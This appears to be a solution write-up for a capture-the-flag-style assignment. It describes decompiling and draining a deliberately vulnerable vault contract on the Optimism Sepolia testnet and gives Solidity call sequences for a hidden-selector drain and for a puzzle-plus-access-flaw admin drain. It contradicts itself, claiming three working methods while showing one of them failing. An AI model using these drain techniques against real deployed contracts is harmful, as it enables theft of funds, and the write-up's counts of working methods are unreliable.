# Smart Contract Engineer Assignment - Follow-up Exercise Answer

## Blind Vault Attack 2.0 - Complete Solution

### Objective
Successfully drain the deployed vault contract at address `0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC` on Optimism Sepolia network without having access to the original source code or ABI.

<br >

---

## Methodology

### 1. Initial Reconnaissance and Bytecode Analysis

Since the contract was deployed without source code, the first step was to reverse-engineer the bytecode to understand the contract's functionality. I used the **Dedaub Decompilation Platform** (library.dedaub.com) to decompile the contract bytecode.

The decompilation process yielded two important outputs:
- **Decompiled Solidity code** (`decompiled-contract.sol`)
- **YUL intermediate representation** (`decompiled-yul`)
to see the contract structure and hidden functions.

This reverse engineering revealed several critical insights:
- Multiple hidden function selectors
- Storage mappings for access control and state management
- A puzzle-solving mechanism to unlock functionality
- Multiple potential attack vectors

### 2. Key Contract Analysis Findings

From the decompiled code, I identified the following critical components:

#### Storage Structure:
```solidity
mapping (uint256 => uint256) _receive; // STORAGE[0x0] - Main storage
mapping (address => bytes32) mapping_1; // STORAGE[0x1] - Access control
mapping (uint256 => address) mapping_2; // STORAGE[0x2] - Address mapping
uint256 stor_3; // STORAGE[0x3] - Counter
bool _store; // STORAGE[0x4] - Store function enabler
```

#### Critical Functions Discovered:
- `0x3a279611` - Puzzle function requiring `[1,2,3,6]` input to enable store
- `store()` - Storage function that activates various contract mechanisms  
- `getAccess()` - Access control function with exploitable logical flaw
- `0xb70b232d` - Primary drain function requiring elevated privileges
- `0xcffd46dc` - Hidden but fake backdoor granting "god" privileges via block hash
- `0xb5d09fae` - Hidden fallback selector enabling direct drainage
  
<br >

---

## Two Working Attack Methods Discovered

Through analysis and testing, I discovered **two different working methods** to drain the contract. Each exploits different vulnerabilities and demonstrates the multiple attack vectors present in the contract.



### Method 1: Hidden Selector Fallback (`HiddenSelectorDrain.s.sol`)

**Strategy:** Exploit the hidden fallback selector combined with status activation.

**Key Discovery:** The contract has a hidden fallback selector `0xb5d09fae` that can drain funds when status is active:

```solidity
// First activate the status
(bool storeSuccess, ) = TARGET_CONTRACT.call(
    abi.encodeWithSelector(STORE_SELECTOR, "status", uint256(1))
);

// Then call the hidden selector
(bool success, bytes memory data) = TARGET_CONTRACT.call(abi.encodePacked(HIDDEN_SELECTOR));
```

**Attack Steps:**
1. Call `store("status", 1)` to activate the drain mechanism  
2. Call the hidden selector `0xb5d09fae` to trigger the fallback drain

**Result:** ✅ **SUCCESS**

---

### Method 2: Sequential Puzzle-Based Attack (`FinalDrainScript.s.sol`)

**Strategy:** Complete the full intended puzzle sequence to gain admin access.

**Key Discovery:** The contract has a designed sequence requiring puzzle solving and access control exploitation:

```solidity
// Step 1: Solve the puzzle
uint256[] memory puzzleInput = new uint256[](4);
puzzleInput[0] = 1;
puzzleInput[1] = 2;
puzzleInput[2] = 3; // 1 + 2 = 3
puzzleInput[3] = 6; // 3 * 2 = 6

(bool puzzleSuccess, ) = TARGET_CONTRACT.call(
    abi.encodeWithSelector(PUZZLE_SELECTOR, puzzleInput)
);

// Step 2: Activate status
(bool storeSuccess, ) = TARGET_CONTRACT.call(
    abi.encodeWithSelector(STORE_SELECTOR, "status", uint256(1))
);

// Step 3: Exploit access control flaw
(bool accessSuccess, ) = TARGET_CONTRACT.call(
    abi.encodeWithSelector(GET_ACCESS_SELECTOR, uint256(0))
);

// Step 4: Drain as admin
(bool drainSuccess, ) = TARGET_CONTRACT.call(
    abi.encodeWithSelector(DRAIN_SELECTOR)
);
```

**Attack Steps:**
1. Solve puzzle with `[1,2,3,6]` to enable the store function
2. Call `store("status", 1)` to activate admin/drain mechanisms
3. Call `getAccess(0)` to exploit logical flaw and gain admin privileges
4. Call `0xb70b232d` drain function as admin

**Result:** ✅ **SUCCESS**

<br >

---


## Critical Vulnerability Recap

The contract contains multiple severe vulnerabilities that enable different attack vectors:


#### 1. Hidden Fallback Selector (`0xb5d09fae`)
The contract contains a hidden drain function accessible through a specific fallback selector:

```solidity
if (!(bytes4(v0) - bytes4(0xb5d09fae7b7af1adf48400132f74ac6d1d5d2e965dfd4f7405cdb9262d87938f))) {
    v2 = 0x525('status');
    require(_receive[v2] - 0, Locked());
    v3 = 0x525('status');
    _receive[v3] = 0;
    emit 0xf25030dea1ced040053b39f74d7a42dd30b2ff8a6c4206fa98f9fceb666cab08(msg.sender, this.balance);
}
```

This allows direct fund drainage when the status is activated, bypassing normal access controls.

#### 2. Access Control Logic Flaw (`getAccess`)
The `getAccess()` function contains a critical logical vulnerability:

```solidity
function getAccess(uint256 _id) public nonPayable { 
    v1 = v2 = _id == keccak256(block.timestamp / 1000, msg.sender, 'access') % 10 ** 6;
    if (_id != keccak256(block.timestamp / 1000, msg.sender, 'access') % 10 ** 6) {
        v1 = uint256(_id ^ 0x42) == _id ^ 0x42;  // Always evaluates to true!
    }
    if (v1) {
        v3 = 0x525('admin');
        mapping_1[msg.sender] = v3; // Grant admin privileges
        emit AccessGranted(msg.sender);
    }
}
```

The condition `uint256(_id ^ 0x42) == _id ^ 0x42` always evaluates to true, making `getAccess(0)` always grant admin privileges.

#### 3. Puzzle Solution Bypass
The puzzle function `0x3a279611` can be solved with the simple pattern `[1,2,3,6]`:

```solidity
// Requires: array[0] + array[1] == array[2] && array[2] * 2 == array[3]
// Solution: 1 + 2 = 3, 3 * 2 = 6
```

This enables the `store` function which is required for several attack paths.

#### 4. Administrative Drain Function
Once any form of elevated access is obtained, the main drain function can be called:

```solidity
function 0xb70b232d() public nonPayable { 
    // Check if caller is owner or admin (or god)
    v0 = 0x525('owner');
    v1 = v2 = msg.sender != address(_receive[v0]);
    if (msg.sender != address(_receive[v0])) {
        v3 = 0x525('admin');
        v1 = mapping_1[msg.sender] != v3;
    }
    require(!v1, Unauthorized());
    
    // Transfer all funds to caller
    v6, v7 = msg.sender.call().value(this.balance).gas(msg.gas);
    require(v6, TransferFailed());
}
```

<br >

---

## Implementation and Testing

### EVM Version Compatibility Issue
During initial testing, all three attack methods appeared to fail due to EVM version incompatibility. The issue was resolved by using the correct EVM version parameter:

```bash
forge script script/[ScriptName].s.sol --broadcast --rpc-url op_sepolia --evm-version cancun
```

**Key Discovery:** The `--evm-version cancun` parameter was essential for proper contract interaction, highlighting the importance of EVM version compatibility in exploit development.

### Multiple Attack Vector Validation
Each attack method was successfully tested by:
1. Replenishing the contract with ETH before each test
2. Running each script independently with the correct EVM version
3. Verifying complete fund drainage after each successful attack
4. Confirming that all three methods work reliably

This demonstrates that the contract contains **at least three distinct and viable attack vectors**, each exploiting different vulnerability classes.

<br >

---  

## Failed Attempt: Block-Based Backdoor (DrainVault.s.sol)  

**Strategy:** Attempt to exploit the 0xcffd46dc backdoor function to gain "god" privileges and then drain.

**Key Discovery :** The backdoor function is designed to grant a role hashed from the string "god" when called with the correct keccak256("drain", msg.sender, block.number). However, this creates a race condition that is nearly impossible to win in a live environment.

### Attack Steps Attempted:

- Calculate the required hash using the current block.number.

- Call 0xcffd46dc with this hash.

- Attempt to call the 0xb70b232d drain function.

**Result:** ❌ FAILURE

Analysis: This method fails for two primary reasons:

- Race Condition: The script calculates the hash for block N, but the transaction is executed in block N+1 or later. The contract's internal check compares the provided hash with one it calculates using the new block number, causing the if condition to be false.

- Successful Call, Failed State Change: Because the function doesn't revert when the if condition fails, the low-level .call() from the script reports a success. The script proceeds, unaware that the state change to "god" never actually happened.

The only reason this attack appeared to work during sequential testing was that the attacker's address retained the 'admin' role from a previous, successful run of the puzzle-based FinalDrainScript. The call to the backdoor was a successful "no-op" that didn't overwrite the existing 'admin' role, allowing the subsequent drain call to pass its authorization check. When tested in isolation, this attack vector is not viable.


